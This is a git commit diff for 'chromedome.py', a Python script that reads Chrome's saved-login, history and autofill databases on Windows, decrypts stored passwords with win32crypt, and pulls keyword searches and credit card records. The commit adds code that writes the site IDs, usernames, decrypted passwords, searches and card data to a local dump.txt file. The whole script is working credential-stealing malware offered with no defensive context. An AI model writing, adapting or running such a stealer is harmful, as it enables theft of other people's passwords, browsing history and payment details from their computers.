29122c00c9cbadb1e59c085732cd9295348f214f
David Enos <bluedangerforyou@gmail.com>
2016-03-24 06:10:48 -0700

    Update chromedome.py

--- chromedome.py
+++ chromedome.py
@@ -2,6 +2,12 @@ from __future__ import print_function
 from os import getenv
 import sqlite3
 import win32crypt
+
+
+f = open("dump.txt", "w")
+username1 = "        Username: "
+siteId = "       Site ID: "
+password_field = "   Password: "
 conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
 conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
 conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
@@ -16,18 +22,23 @@ for result in cursor.fetchall():
 		print('Username: ' + result[1])
 		print('Password: ' + password)
 		print('---------------------------------------------')
+		f.write(str(siteId + result[0] + username1 + result[1] + password_field + password))
+		
+		
 cursor3.execute("SELECT * FROM keyword_search_terms") 
 print('---------------------------------------------')
 print("Google Keyword Searches:")
 result = cursor3.fetchall() 
 for r in result:
-    print(r)
+        print (r)
+        f.write(str(r))
 
 cursor1.execute("SELECT * FROM credit_cards")
 print('---------------------------------------------')
 print("Credit Card Data:")
 result = cursor1.fetchall() 
 for r in result:
-    print(r)
+    f.write(str(result))
+    f.close()
 
 
